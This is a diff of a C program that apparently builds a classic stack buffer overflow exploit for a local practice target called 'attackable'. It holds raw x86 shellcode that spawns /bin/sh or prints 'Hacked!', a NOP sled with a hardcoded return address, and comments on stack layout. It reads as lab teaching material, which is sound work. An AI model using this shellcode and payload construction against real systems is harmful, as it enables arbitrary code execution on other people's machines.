@@ -1,10 +1,8 @@
-#include <stdio.h>
-#include <stdlib.h>
 #include <string.h>
 
 #define NOP 0x90
 
-char hacked_code[] = "\xeb\x14"       // jmp    8048076 <_start+0x16>
+char print_hacked[] = "\xeb\x14"      // jmp    8048076 <_start+0x16>
     "\x31\xc0"                        // xor    %eax,%eax
     "\xb0\x04"                        // mov    $0x4,%al
     "\x31\xdb"                        // xor    %ebx,%ebx
@@ -19,63 +17,70 @@ char hacked_code[] = "\xeb\x14"       // jmp    8048076 <_start+0x16>
     "\xe8\xe7\xff\xff\xff"            // call   8048062 <_start+0x2>
     "Hacked!";
 
-char short_shellcode[] = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07"
+char spawn_shell[] = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07"
     "\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31"
     "\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";
 
+/** 
+    Address is in the Little Endian format
 
-// address of buffer on system found to be - 0xffffcdcc (ASLR was disabled) 
-// address changes every time a new terminal is opened.
-// address is written in the Little Endian format
+    Regular execution:
+    ------------------------------------
+    | Stack of the vulnerable program, |
+    | in this case attackable.c        |
+    ------------------------------------
+    
+    The address of the buffer changes if the program is executed from gdb or from a new bash. Why?
 
-char retaddr[] = "\x3c\xcd\xff\xff";
+    Execution from GDB:
+    -------------------------------------------
+    | Stack of the vulnerable program,| GDB's |
+    | in this case attackable.c       | stack |
+    -------------------------------------------
+    
+    Execution from a new bash:
+    --------------------------------------------
+    | Stack of the vulnerable program,| bash's |
+    | in this case attackable.c       | stack  |
+    --------------------------------------------
+
+**/
 
 int main(int argc, char **argv) {
 
     /**
-        buffer (in the vulnerable program) is 80 bytes,
-        so the stack looks like this
-        ---------------------------------------------------------------------------
-        | 80 bytes   | 4 bytes | 8 bytes  | 4 bytes | 4 bytes | 4 bytes | 4 bytes |
-        | Buffer -   | int i - | Slack -  | EBP -   | RET -   | argc -  | argv -  |
-        ---------------------------------------------------------------------------
-        Find out what the slack is for!
-        We will replace the contents of the stack from buffer 
-        and overwrite the return address so that it points to 
-        the address of buffer.
-        ---------------------------------------------------------
-        | Shellcode padded      | PTR to shell        | NULL    |
-        | with NOP - 96 bytes   | code - 4 bytes      | 4 bytes |
-        ---------------------------------------------------------
+        Buffer of attackable.c, the stack diagram can be found in attackable.c
+        Content with which attackable.c's buffer will be overwritten
+        -----------------------------------------------
+        | Shellcode padded      | PTR to shell        |
+        | with NOP - 92 bytes   | code - 4 bytes      |
+        -----------------------------------------------
     **/
-    
-    char buffer[108];
-    // fill the buffer with NOP instructions
-    memset(buffer, NOP, sizeof(buffer));
-    printf("Buffer: %s\n", buffer);
-    // set the first 4 bytes to EGG=
-    memcpy(buffer, "EGG=", 4);
-    printf("Buffer: %s\n", buffer);
-    // set shellcode to EGG
-    switch(argv[1][0]) {
+
+    // Address of the buffer being overflowed.
+    char retaddr[] = "\xb0\xfd\xff\xbf";
+    char shellcode[96];
+    // Fill the buffer with NOP instructions
+    memset(shellcode, NOP, sizeof(shellcode));
+    printf("Shellcode: %s\n", shellcode);
+    char choice = '0';
+    if (argc >= 2) {
+        choice = argv[1][0]; 
+    }
+    switch(choice) {
         case '1': 
-            printf("Size of shellcode: %d\n", strlen(hacked_code));
-            memcpy(buffer+4, hacked_code, strlen(hacked_code));
+            memcpy(shellcode, print_hacked, strlen(print_hacked));
             break;
         default: 
-            printf("Size of shellcode: %d\n", strlen(short_shellcode));
-            memcpy(buffer+4, short_shellcode, strlen(short_shellcode));
+            memcpy(shellcode, spawn_shell, strlen(spawn_shell));
     }
-    printf("Buffer: %s\n", buffer);
-    // fill the return address which from 88
-    memcpy(buffer+100, retaddr, 4);
-    printf("Buffer: %s\n", buffer);
-    // fill NULL at the end of the shellcode
-    memcpy(buffer+104, "\x00\x00\x00\x00", 4);
-    printf("Buffer: %s\n", buffer);
+    printf("Shellcode: %s\n", shellcode);
+    memcpy(shellcode+92, retaddr, 4);
+    printf("Shellcode: %s\n", shellcode);
 
-    putenv(buffer);
-    system("/bin/sh");
+    // Test the shellcode
+    char *arg[] = {"bin/aleph_one/attackable", shellcode, NULL};
+    execve("bin/aleph_one/attackable", arg, NULL);
 
     return 0;
 }
